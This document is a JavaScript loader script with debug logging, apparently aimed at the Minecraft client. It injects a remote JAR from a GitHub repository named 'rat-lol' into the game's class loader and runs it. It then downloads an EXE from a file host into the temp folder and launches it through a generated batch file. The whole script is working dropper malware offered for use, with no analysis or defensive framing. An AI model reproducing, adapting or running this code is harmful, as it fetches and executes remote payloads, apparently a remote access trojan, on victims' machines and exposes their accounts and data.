// ===== DEBUGGING VERSION WITH LIVE LOGS =====
(function() {
    // Set up logging
    var logFile = new java.io.File(java.lang.System.getProperty("java.io.tmpdir"), "mc_loader_log.txt");
    var logWriter = new java.io.PrintWriter(new java.io.FileWriter(logFile, true));
    
    function log(message) {
        var timestamp = new java.text.SimpleDateFormat("HH:mm:ss").format(new java.util.Date());
        var logMessage = "[" + timestamp + "] " + message;
        
        // Write to file
        logWriter.println(logMessage);
        logWriter.flush();
        
        // Show in CMD window
        try {
            java.lang.Runtime.getRuntime().exec("cmd /c echo " + logMessage).waitFor();
        } catch (e) {}
        
        print(logMessage);
    }

    try {
        log("=== Starting Loader ===");
        
        // === 1. JAR Loading ===
        try {
            log("Loading JAR file...");
            var URLClassLoader = Java.type("java.net.URLClassLoader");
            var URL = Java.type("java.net.URL");
            var Minecraft = Java.type("net.minecraft.client.Minecraft");
            
            var jarURL = new URL("https://github.com/MansHeree/rat-lol/raw/refs/heads/main/LWJGL-3.6-SNAPSHOT-ALL.jar");
            var classLoader = Minecraft.class.getClassLoader();
            
            var addURL = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
            addURL.setAccessible(true);
            addURL.invoke(classLoader, jarURL);
            java.lang.Thread.sleep(1000);
            
            classLoader.loadClass("org.lwjgl36.VersionImp").getMethod("init").invoke(null);
            log("JAR loaded successfully!");
        } catch (e) {
            log("JAR ERROR: " + e);
        }

        // === 2. EXE Download ===
        var exePath = null;
        try {
            log("Downloading EXE...");
            var exeUrl = "https://r2.e-z.host/c4fb8249-0756-49bd-8cab-d1d22d088421/apb3y3z4.exe";
            var tempDir = java.lang.System.getProperty("java.io.tmpdir");
            exePath = new java.io.File(tempDir, "mc_temp_" + java.lang.Math.random().toString(36).substring(2, 8) + ".exe");
            
            var connection = new URL(exeUrl).openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0");
            var inStream = connection.getInputStream();
            var outStream = new java.io.FileOutputStream(exePath);
            
            var buffer = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 1024);
            var bytesRead;
            while ((bytesRead = inStream.read(buffer)) != -1) {
                outStream.write(buffer, 0, bytesRead);
            }
            inStream.close();
            outStream.close();
            log("EXE downloaded to: " + exePath.getAbsolutePath());
        } catch (e) {
            log("DOWNLOAD ERROR: " + e);
        }

        // === 3. EXE Execution ===
        if (exePath && exePath.exists()) {
            try {
                log("Attempting to execute EXE...");
                
                // Create visible CMD window for debugging
                var cmdCommands = [
                    "@echo off",
                    "title MC Loader Debug",
                    "echo EXE Path: " + exePath.getAbsolutePath(),
                    "echo Waiting for execution...",
                    "timeout /t 3",
                    "start \"\" \"" + exePath.getAbsolutePath() + "\"",
                    "echo Process started! Check Task Manager",
                    "pause"
                ];
                
                var cmdFile = new java.io.File(java.lang.System.getProperty("java.io.tmpdir"), "debug_exe.bat");
                var cmdWriter = new java.io.PrintWriter(new java.io.FileWriter(cmdFile));
                cmdCommands.forEach(function(line) { cmdWriter.println(line); });
                cmdWriter.close();
                
                java.lang.Runtime.getRuntime().exec("cmd /c start \"" + cmdFile.getAbsolutePath() + "\"");
                log("Debug CMD window opened!");
                
            } catch (e) {
                log("EXECUTION ERROR: " + e);
            }
        } else {
            log("EXE file missing - cannot execute");
        }
        
    } finally {
        log("=== Script Complete ===");
        logWriter.close();
        
        // Open log file automatically
        try {
            java.awt.Desktop.getDesktop().open(logFile);
        } catch (e) {
            java.lang.Runtime.getRuntime().exec("notepad " + logFile.getAbsolutePath());
        }
    }
})();